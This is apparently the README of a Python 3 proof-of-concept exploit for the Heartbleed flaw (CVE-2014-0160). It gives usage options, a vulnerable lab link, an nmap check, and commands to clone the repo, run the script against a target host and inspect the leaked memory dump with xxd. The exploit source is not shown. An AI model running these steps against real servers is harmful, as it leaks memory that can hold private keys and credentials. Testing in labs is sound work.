# heartbleed
A Heartbleed (CVE-2014-0160) PoC in Python 3

```
usage: heartbleed_.py [-h] -s HOST [-p PORT] [-f OUTPUT_FILE]

Heartbleed PoC

options:
  -h, --help            show this help message and exit
  -s HOST, --host HOST  hostname or IP address
  -p PORT, --port PORT  TCP port number  (default is 443)
  -f OUTPUT, --output_file OUTPUT output file name

```

1. If you want a vulnerable server to test, you can set it up from [here](https://github.com/jas9reet/heartbleed-lab "Heartbleed lab")
2. Test for heartbleed vulnerability using nmap:
```
  $ nmap -v -p8443 --script ssl-heartbleed $IP
```

3. Install the script if you haven't already, change to directory:
```
  $ git clone https://github.com/H4R335HR/heartbleed/ && cd heartbleed
```
  
4. Run the script:
```
With Default options
  $ python3 heartbleed.py -s $IP
OR with custom port and outfile name
  $ python3 heartbleed.py -s $IP -p 8443 -f output.bin
```
5. After running the script, check the output file using xxd to see the results:
```
  $ xxd *.bin | less
```
